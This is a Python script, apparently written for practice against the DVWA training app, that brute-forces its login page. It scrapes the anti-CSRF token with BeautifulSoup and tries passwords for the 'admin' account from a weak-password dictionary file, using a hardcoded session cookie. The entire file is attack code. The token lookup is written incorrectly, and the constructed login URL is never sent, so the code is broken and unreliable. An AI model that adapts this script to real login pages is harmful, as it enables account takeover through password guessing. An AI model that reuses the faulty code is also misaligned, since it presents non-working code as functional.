#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from bs4 import BeautifulSoup
import requests

header = {'Host': '192.168.153.130',
          'Cache-Control': 'max-age=0',
          'If-None-Match': "307-52156c6a290c0",
          'If-Modified-Since': 'Mon, 05 Oct 2015 07:51:07 GMT',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36'
                        ' (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36',
          'Accept': '*/*',
          'Referer': 'http://192.168.153.130/dvwa/vulnerabilities/brute/index.php',
          'Accept-Encoding': 'gzip, deflate, sdch',
          'Accept-Language': 'zh-CN,zh;q=0.8',
          'Cookie': 'security=high; PHPSESSID=5re92j36t4f2k1gvnqdf958bi2'}

url = "http://localhost:88/vulnerabilities/brute/"


def get_token(req_url, headers):
    response = requests.get(req_url, headers=headers)
    print(response.status_code)
    the_page = response.content.decode("utf-8")
    # print(the_page)
    print(len(the_page))
    soup = BeautifulSoup(the_page, "html.parser")
    print(soup.find("body", "home"))
    input0 = soup.find_all(name="user_token")
    print(input0)
    token = input0["value"]  # get the user_token
    return token


if __name__ == "__main__":
    user_token = get_token(url, header)
    i = 0
    for line in open("weak_password.dict"):
        try_url = url + "?username=admin&password=" + line.strip() + "&Login=Login&user_token=" + user_token
        i = i + 1
        print(i, 'admin', line.strip())
        user_token = get_token(url, header)
